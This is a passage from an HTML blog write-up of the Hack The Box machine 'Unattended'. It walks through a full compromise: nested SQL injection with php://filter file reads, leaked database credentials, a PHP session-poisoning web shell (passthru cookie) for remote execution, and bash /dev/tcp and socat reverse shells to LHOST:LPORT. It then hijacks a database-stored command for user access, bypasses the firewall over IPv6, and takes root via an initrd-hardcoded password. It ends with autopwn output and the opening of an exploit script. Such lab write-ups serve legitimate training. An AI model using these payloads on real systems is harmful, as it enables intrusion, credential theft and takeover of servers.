PD9waHAKJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKJHVzZXJuYW1lID0gIm5lc3RlZGZsYW5kZXJzIjsKJHBhc3N3b3JkID0gIjEwMzY5MTNjZjdkMzhkNGVhNGY3OWIwNTBmMTcxZTlmYmYzZjVlIjsKJGRiID0gIm5lZGR5IjsKJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCwgJGRiKTsKJGRlYnVnID0gRmFsc2U7CgppbmNsdWRlICI2ZmIxNzgxN2VmYjQxMzFhZTRhZTFhY2FlMGY3ZmQ0OC5waHAiOwoKZnVuY3Rpb24gZ2V0VHBsRnJvbUlEKCRjb25uKSB7CglnbG9iYWwgJGRlYnVnOwoJJHZhbGlkX2lkcyA9IGFycmF5ICgyNSw0NjUsNTg3KTsKCWlmICggKGFycmF5X2tleV9leGlzdHMoJ2lkJywgJF9HRVQpKSAmJiAoaW50dmFsKCRfR0VUWydpZCddKSA9PSAkX0dFVFsnaWQnXSkgJiYgKGluX2FycmF5KGludHZhbCgkX0dFVFsnaWQnXSksJHZhbGlkX2lkcykpICkgewoJCQkkc3FsID0gIlNFTEVDVCBuYW1lIEZST00gaWRuYW1lIHdoZXJlIGlkID0gJyIuJF9HRVRbJ2lkJ10uIiciOwoJfSBlbHNlIHsKCQkkc3FsID0gIlNFTEVDVCBuYW1lIEZST00gaWRuYW1lIHdoZXJlIGlkID0gJzI1JyI7Cgl9CglpZiAoJGRlYnVnKSB7IGVjaG8gInNxbHRwbDogJHNxbDxicj5cbiI7IH0gCgkKCSRyZXN1bHQgPSAkY29ubi0</code></pre>
<p><p></p>
Let&rsquo;s decode it:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">echo</span> PD9waHAKJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKJHVzZXJuYW1lID0gIm5lc3RlZGZsYW5kZXJzIjsKJHBhc3N3b3JkID0gIjEwMzY5MTNjZjdkMzhkNGVhNGY3OWIwNTBmMTcxZTlmYmYzZjVlIjsKJGRiID0gIm5lZGR5IjsKJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCwgJGRiKTsKJGRlYnVnID0gRmFsc2U7CgppbmNsdWRlICI2ZmIxNzgxN2VmYjQxMzFhZTRhZTFhY2FlMGY3ZmQ0OC5waHAiOwoKZnVuY3Rpb24gZ2V0VHBsRnJvbUlEKCRjb25uKSB7CglnbG9iYWwgJGRlYnVnOwoJJHZhbGlkX2lkcyA9IGFycmF5ICgyNSw0NjUsNTg3KTsKCWlmICggKGFycmF5X2tleV9leGlzdHMoJ2lkJywgJF9HRVQpKSAmJiAoaW50dmFsKCRfR0VUWydpZCddKSA9PSAkX0dFVFsnaWQnXSkgJiYgKGluX2FycmF5KGludHZhbCgkX0dFVFsnaWQnXSksJHZhbGlkX2lkcykpICkgewoJCQkkc3FsID0gIlNFTEVDVCBuYW1lIEZST00gaWRuYW1lIHdoZXJlIGlkID0gJyIuJF9HRVRbJ2lkJ10uIiciOwoJfSBlbHNlIHsKCQkkc3FsID0gIlNFTEVDVCBuYW1lIEZST00gaWRuYW1lIHdoZXJlIGlkID0gJzI1JyI7Cgl9CglpZiAoJGRlYnVnKSB7IGVjaG8gInNxbHRwbDogJHNxbDxicj5cbiI7IH0gCgkKCSRyZXN1bHQgPSAkY29ubi0 <span class="p">|</span> base64 -d
</span></span></code></pre></div></div>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$servername</span> <span class="o">=</span> <span class="s2">&#34;localhost&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$username</span> <span class="o">=</span> <span class="s2">&#34;nestedflanders&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$password</span> <span class="o">=</span> <span class="s2">&#34;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$db</span> <span class="o">=</span> <span class="s2">&#34;neddy&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$servername</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$db</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$debug</span> <span class="o">=</span> <span class="k">False</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;6fb17817efb4131ae4ae1acae0f7fd48.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">getTplFromID</span><span class="p">(</span><span class="nv">$conn</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$debug</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$valid_ids</span> <span class="o">=</span> <span class="k">array</span> <span class="p">(</span><span class="mi">25</span><span class="p">,</span><span class="mi">465</span><span class="p">,</span><span class="mi">587</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]),</span><span class="nv">$valid_ids</span><span class="p">))</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT name FROM idname where id = &#39;&#34;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT name FROM idname where id = &#39;25&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&#34;sqltpl: </span><span class="si">$sql</span><span class="s2">&lt;br&gt;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span> <span class="p">}</span> 
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-</span><span class="nx">base64</span><span class="o">:</span> <span class="nx">invalid</span> <span class="nx">input</span></span></span></code></pre></div></p>

<p>Nice! We found some credentials for the database&hellip;.</p>

<h2 id="lfi-to-rce-via-php-session-poisoning">LFI to RCE (via PHP session poisoning)</h2>

<p>But what about this strange
included file &lsquo;6fb17817efb4131ae4ae1acae0f7fd48.php&rsquo;? Let&rsquo;s read the source
code from it too:</p>
<pre tabindex="0"><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#39; UNION
SELECT &#39;php://filter/read=convert.base64-encode/resource=/var/www/html/6fb17817efb4131ae4ae1acae0f7fd48.php&#39; --+&#34; --+

PD9waHAKc2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9TRVNTSU9OWyd1c2VyX25hbWUnXSkpewoJJHVzZXJfbmFtZSA9ICRfU0VTU0lPTlsndXNlcl9uYW1lJ107Cn0KCmZvcmVhY2ggKCRfQ09PS0lFIGFzICRrZXkgPT4gJHZhbCkgewoJJF9TRVNTSU9OWyRrZXldID0gJHZhbDsKfQoKLyogcmVtb3ZlZCBldmVyeXRoaW5nIGJlY2F1c2Ugb2YgdW5kZXJnb2luZyBpbnZlc3RpZ2F0aW9uLCBwbGVhc2UgY2hlY2sgZGV2IGFuZCBzdGFnaW5nICovCg==</code></pre>
<p><p></p>
Let&rsquo;s decode it:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">echo</span> <span class="nv">PD9waHAKc2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9TRVNTSU9OWyd1c2VyX25hbWUnXSkpewoJJHVzZXJfbmFtZSA9ICRfU0VTU0lPTlsndXNlcl9uYW1lJ107Cn0KCmZvcmVhY2ggKCRfQ09PS0lFIGFzICRrZXkgPT4gJHZhbCkgewoJJF9TRVNTSU9OWyRrZXldID0gJHZhbDsKfQoKLyogcmVtb3ZlZCBldmVyeXRoaW5nIGJlY2F1c2Ugb2YgdW5kZXJnb2luZyBpbnZlc3RpZ2F0aW9uLCBwbGVhc2UgY2hlY2sgZGV2IGFuZCBzdGFnaW5nICovCg</span><span class="o">==</span> <span class="p">|</span> base64 -d
</span></span></code></pre></div></div>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user_name&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$user_name</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$_COOKIE</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* removed everything because of undergoing investigation, please check dev and staging */</span></span></span></code></pre></div></p>

<p>We struck gold! This code means that every cookie name/value pair is saved inside the PHP session. PHP sessions are stored in temporary files inside a specific folder. This folder is set using the session.save_path inside the php.ini file (e.g. <code>session.save_path = &quot;/var/lib/php/sessions&quot;</code>).</p>

<p>Therefore, we can either read the php.ini file to learn this location or brute-force well known paths of PHP session storage. I did the latter and I discovered that indeed the sessions were stored in /var/lib/php/sessions/.</p>

<p>Now, we can set a cookie with a value <code>&quot;&lt;?php passthru($_REQUEST['cmd'])?&gt;&quot;</code> and this will be stored inside a file at <code>/var/lib/php/sessions/sess_&lt;PHPSESSID&gt;</code>. Then all we have to do is to include/run this file using our nested SQL injection technique:</p>
<pre tabindex="0"><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#39; UNION SELECT &#39;/var/lib/php/sessions/sess_d0rosoogt4afnin1qtic4ju612&#39; --+&#34; --+&amp;cmd=whoami

PHPSESSID|s:26:&#34;d0rosoogt4afnin1qtic4ju612&#34;;test|s:32:&#34;www-data &#34;;</code></pre>
<p>We achieved remote command execution!</p>

<p><p></p>
To get a full shell you can try payloads like those (url-encoded them to make your life easier):</p>
<pre tabindex="0"><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/LHOST/LPORT1 0&gt;&amp;1&#39;</code></pre><pre tabindex="0"><code>socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp6:[LHOST]:LPORT</code></pre>
<p><p></p>
Or you can try my <a href="https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/Unattended/autopwn_unattended.py" target="_blank">autopwn script</a>:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">[*] LHOST: dead:beef:2::12d0
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">What shell do you want?
</span></span></span><span class="line"><span class="cl"><span class="go">[1] www-data@unattended
</span></span></span><span class="line"><span class="cl"><span class="go">[2] guly@unattended
</span></span></span><span class="line"><span class="cl"><span class="go">[3] root@unattended
</span></span></span><span class="line"><span class="cl"><span class="go">[4] Exit
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Please enter a number 1-4: 1
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Trying to bind to dead:beef:2::12d0 on port 60000: Done
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Waiting for connections on dead:beef:2::12d0:60000: Got connection from dead:beef::250:56ff:feb9:880a on port 53778
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Injecting session via cookies: Status code 200
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Cookies: {&#39;PHPSESSID&#39;: &#39;4mlq7e9jafls6pmnmajd7hmug0&#39;, &#39;user_name&#39;: &#39;&lt;?php passthru($_REQUEST[cmd])?&gt;&#39;}
</span></span></span><span class="line"><span class="cl"><span class="go">[*] LFI via SQLI status code: 200
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Testing RCE: SUCCESS
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Switching to interactive mode
</span></span></span><span class="line"><span class="cl"><span class="go">www-data@unattended:/var/www/html$
</span></span></span></code></pre></div></div></p>

<h2 id="getting-user-guly">Getting user guly</h2>

<p>Do you remember the table &lsquo;config&rsquo;? Now that we have command execution and the database credentials we can examine it again like this:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">www-data@unattended:/var/www/html$ mysql -u nestedflanders -p&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39; -e &#39;select * from config&#39; neddy
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...
</span></span></span><span class="line"><span class="cl"><span class="go">|  86 | checkrelease | /home/guly/checkbase.pl;/home/guly/checkplugins.pl; |
</span></span></span><span class="line"><span class="cl"><span class="go">....
</span></span></span></code></pre></div></div></p>

<p>Hmmm&hellip; This line looks fishy. Let&rsquo;s try to exploit it in order to run our own Perl script. First, we have to find an executable and writable location for our perl script:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> find / -writable -type d 2&gt; /dev/null
</span></span><span class="line"><span class="cl"><span class="go">/proc/1746/task/1746/fd
</span></span></span><span class="line"><span class="cl"><span class="go">/proc/1746/fd
</span></span></span><span class="line"><span class="cl"><span class="go">/proc/1746/map_files
</span></span></span><span class="line"><span class="cl"><span class="go">/var/tmp
</span></span></span><span class="line"><span class="cl"><span class="go">/var/lib/php/sessions
</span></span></span><span class="line"><span class="cl"><span class="go">/var/lib/nginx/fastcgi
</span></span></span><span class="line"><span class="cl"><span class="go">/var/lib/nginx/proxy
</span></span></span><span class="line"><span class="cl"><span class="go">/var/lib/nginx/proxy/1
</span></span></span><span class="line"><span class="cl"><span class="go">/var/lib/nginx/proxy/1/00
</span></span></span><span class="line"><span class="cl"><span class="go">/var/lib/nginx/body
</span></span></span><span class="line"><span class="cl"><span class="go">/var/lib/nginx/scgi
</span></span></span><span class="line"><span class="cl"><span class="go">/var/lib/nginx/uwsgi
</span></span></span><span class="line"><span class="cl"><span class="go">/var/cache/apache2/mod_cache_disk
</span></span></span><span class="line"><span class="cl"><span class="go">/dev/mqueue
</span></span></span><span class="line"><span class="cl"><span class="go">/dev/shm
</span></span></span><span class="line"><span class="cl"><span class="go">/tmp
</span></span></span><span class="line"><span class="cl"><span class="go">/run/lock
</span></span></span><span class="line"><span class="cl"><span class="go">/run/lock/apache2
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> mount <span class="p">|</span> grep noexec
</span></span><span class="line"><span class="cl"><span class="go">...
</span></span></span><span class="line"><span class="cl"><span class="go">tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,noexec)
</span></span></span><span class="line"><span class="cl"><span class="go">...
</span></span></span><span class="line"><span class="cl"><span class="go">tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
</span></span></span><span class="line"><span class="cl"><span class="go">...
</span></span></span><span class="line"><span class="cl"><span class="go">tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
</span></span></span><span class="line"><span class="cl"><span class="go">tmpfs on /var/tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
</span></span></span></code></pre></div></div></p>

<p>As you can see several paths (<strong><em>/dev/shm, /tmp, /var/tmp</em></strong>) are mounted using the &lsquo;noexec&rsquo; option. This means that if we put our Perl script here, it cannot be executed. So, let&rsquo;s make a directory inside <strong><em>/var/lib/php/sessions</em></strong> and put it there instead:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> mkdir /var/lib/php/sessions/a
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> which perl
</span></span><span class="line"><span class="cl"><span class="go">/usr/bin/perl
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> which socat
</span></span><span class="line"><span class="cl"><span class="go">/usr/bin/socat
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> <span class="nb">printf</span> <span class="s1">&#39;#!/usr/bin/perl\nexec(&#34;/usr/bin/socat exec:bash,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT&#34;);\n&#39;</span> &gt; /var/lib/php/sessions/a/checkrelease.pl
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> chmod +x /var/lib/php/sessions/a/checkrelease.pl
</span></span></code></pre></div></div></p>

<p>Now, we have to alter the database appropriately:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> mysql -u nestedflanders -p<span class="s1">&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39;</span> -e <span class="s1">&#39;update config set option_value=&#34;/var/lib/php/sessions/a/checkrelease.pl;&#34; where option_name=&#34;checkrelease&#34;&#39;</span> neddy
</span></span></code></pre></div></div></p>

<p>Let&rsquo;s verify out change:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">www-data@unattended:/var/www/html$ mysql -u nestedflanders -p&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39; -e &#39;select * from config&#39; neddy
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...
</span></span></span><span class="line"><span class="cl"><span class="go">|  86 | checkrelease | /var/lib/php/sessions/a/checkrelease.pl; |
</span></span></span><span class="line"><span class="cl"><span class="go">....
</span></span></span></code></pre></div></div></p>

<p>Don&rsquo;t forget to setup your listener:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> socat file:<span class="sb">`</span>tty<span class="sb">`</span>,echo<span class="o">=</span>0,raw tcp-listen:LPORT
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">guly@unattended:~$ cat user.txt
</span></span></span><span class="line"><span class="cl"><span class="go">cat user.txt
</span></span></span><span class="line"><span class="cl"><span class="go">9b413f3******************70eef14
</span></span></span></code></pre></div></div></p>

<p>Later, I discovered that there is no need for a Perl script. We can simply put any shell command in that database field like this:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">mysql -u nestedflanders -p&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39; -e &#39;update config set option_value=&#34;socat exec:/bin/bash,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT&#34; where option_name=&#34;checkrelease&#34;&#39; neddy
</span></span></span></code></pre></div></div></p>

<p>There is another thing you have to pay attention&hellip; The host-based firewall (iptables):
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat /etc/iptables/rules.v4
</span></span><span class="line"><span class="cl"><span class="gp">#</span> Generated by iptables-save v1.6.0 on Wed Dec <span class="m">19</span> 21:55:49 <span class="m">2018</span>
</span></span><span class="line"><span class="cl"><span class="go">*filter
</span></span></span><span class="line"><span class="cl"><span class="go">:INPUT DROP [7:1813]
</span></span></span><span class="line"><span class="cl"><span class="go">:FORWARD ACCEPT [0:0]
</span></span></span><span class="line"><span class="cl"><span class="go">:OUTPUT DROP [34:2661]
</span></span></span><span class="line"><span class="cl"><span class="go">-A INPUT -i lo -j ACCEPT
</span></span></span><span class="line"><span class="cl"><span class="go">-A INPUT -i ens33 -m state --state RELATED,ESTABLISHED -j ACCEPT
</span></span></span><span class="line"><span class="cl"><span class="go">-A INPUT -i ens33 -p tcp -m multiport --dports 80,443 -j ACCEPT
</span></span></span><span class="line"><span class="cl"><span class="go">-A INPUT -i ens33 -p icmp -j ACCEPT
</span></span></span><span class="line"><span class="cl"><span class="go">-A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
</span></span></span><span class="line"><span class="cl"><span class="go">-A FORWARD -j DROP
</span></span></span><span class="line"><span class="cl"><span class="go">-A OUTPUT -o lo -j ACCEPT
</span></span></span><span class="line"><span class="cl"><span class="go">-A OUTPUT -o ens33 -m state --state RELATED,ESTABLISHED -j ACCEPT
</span></span></span><span class="line"><span class="cl"><span class="go">-A OUTPUT -o ens33 -p tcp -m multiport --dports 80,443 -j ACCEPT
</span></span></span><span class="line"><span class="cl"><span class="go">-A OUTPUT -o ens33 -p icmp -j ACCEPT
</span></span></span><span class="line"><span class="cl"><span class="go">COMMIT
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">#</span> Completed on Wed Dec <span class="m">19</span> 21:55:49 <span class="m">2018</span>
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> cat /etc/iptables/rules.v6
</span></span><span class="line"><span class="cl"><span class="gp">#</span> Generated by ip6tables-save v1.6.0 on Thu Dec <span class="m">20</span> 12:27:54 <span class="m">2018</span>
</span></span><span class="line"><span class="cl"><span class="go">*filter
</span></span></span><span class="line"><span class="cl"><span class="go">:INPUT ACCEPT [0:0]
</span></span></span><span class="line"><span class="cl"><span class="go">:FORWARD ACCEPT [0:0]
</span></span></span><span class="line"><span class="cl"><span class="go">:OUTPUT ACCEPT [0:0]
</span></span></span><span class="line"><span class="cl"><span class="go">COMMIT
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">#</span> Completed on Thu Dec <span class="m">20</span> 12:27:54 <span class="m">2018</span>
</span></span></code></pre></div></div></p>

<p>As you can see only ports 80 and 443 are allowed for IPv4 and therefore we have to use one of them for our remote shell. Of course, we can use the IPv6 protocol instead (for which all ports are allowed).</p>

<h2 id="getting-root">Getting root</h2>

<p>Let&rsquo;s see what groups is user <em>guly</em> a member of:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">guly@unattended:~$ groups
</span></span></span><span class="line"><span class="cl"><span class="go">guly cdrom floppy audio dip video plugdev grub netdev
</span></span></span></code></pre></div></div></p>

<p>The group &lsquo;<strong>grub</strong>&rsquo; stands out. This is not a common group. Let&rsquo;s find what files belong to this group:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">guly@unattended:~$ find / -group grub 2&gt; /dev/null
</span></span></span><span class="line"><span class="cl"><span class="go">/boot/initrd.img-4.9.0-8-amd64
</span></span></span></code></pre></div></div></p>

<p>Let&rsquo;s explore this initrd image. We can decompress it like this:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">guly@unattended:~$ mkdir .test &amp;&amp; cd .test
</span></span></span><span class="line"><span class="cl"><span class="go">guly@unattended:~/.test$ zcat /boot/initrd.img-4.9.0-8-amd64 | cpio -idmv
</span></span></span></code></pre></div></div></p>

<p>The name of this box is &ldquo;Unattended&rdquo;. Maybe the administrators have automated some procedures inside the initrd image. Let&rsquo;s search for hardcoded passwords:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> grep -n3 -IR password
</span></span><span class="line"><span class="cl"><span class="go">...
</span></span></span><span class="line"><span class="cl"><span class="go">scripts/local-top/cryptroot-299-        if [ ! -e &#34;$NEWROOT&#34; ]; then
</span></span></span><span class="line"><span class="cl"><span class="go">scripts/local-top/cryptroot:300:      # guly: we have to deal with lukfs password sync when root changes her one
</span></span></span><span class="line"><span class="cl"><span class="go">scripts/local-top/cryptroot-301-      if ! crypttarget=&#34;$crypttarget&#34; cryptsource=&#34;$cryptsource&#34; \
</span></span></span><span class="line"><span class="cl"><span class="go">scripts/local-top/cryptroot-302-        /sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen ; then
</span></span></span><span class="line"><span class="cl"><span class="go">scripts/local-top/cryptroot:303:                message &#34;cryptsetup: cryptsetup failed, bad password or options?&#34;
</span></span></span><span class="line"><span class="cl"><span class="go">scripts/local-top/cryptroot-304-                sleep 3
</span></span></span><span class="line"><span class="cl"><span class="go">scripts/local-top/cryptroot-305-                continue
</span></span></span><span class="line"><span class="cl"><span class="go">scripts/local-top/cryptroot-306-            fi
</span></span></span><span class="line"><span class="cl"><span class="go">...
</span></span></span></code></pre></div></div></p>

<p>This &lsquo;/sbin/uinitrd c0m3s3f0ss34nt4n1&rsquo; looks promising&hellip;. Let&rsquo;s try it:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">guly@unattended:~/.test$ ./sbin/uinitrd c0m3s3f0ss34nt4n1
</span></span></span><span class="line"><span class="cl"><span class="go">132f93ab100671dcb263acaf5dc95d8260e8b7c6
</span></span></span></code></pre></div></div></p>

<p>The comment says &ldquo;# guly: we have to deal with lukfs password sync when root changes her one&rdquo;. Maybe this &lsquo;132f93ab100671dcb263acaf5dc95d8260e8b7c6&rsquo; is the root password. Let&rsquo;s try it:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">guly@unattended:~/.test$ su - root
</span></span></span><span class="line"><span class="cl"><span class="go">Password: 132f93ab100671dcb263acaf5dc95d8260e8b7c6
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">root@unattended:~# cat /root/root.txt
</span></span></span><span class="line"><span class="cl"><span class="go">559c0**********************791d3
</span></span></span></code></pre></div></div></p>

<p>Bingo! That&rsquo;s all folks! :o)</p>

<h1 id="autopwn-script">Autopwn script</h1>

<p>Here is my <a href="https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/Unattended/autopwn_unattended.py" target="_blank">autopwn script</a>. It uses IPv6 by default (which is no blocked by the host-based firewall). But you can change it to use IPv4 (IPV6 = False). In this case you need to run it with sudo (or as root) in order to be able to bind the privileged ports (80 and 443).</p>

<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python2</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Author: Alamot (Antonios Tsolis)</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
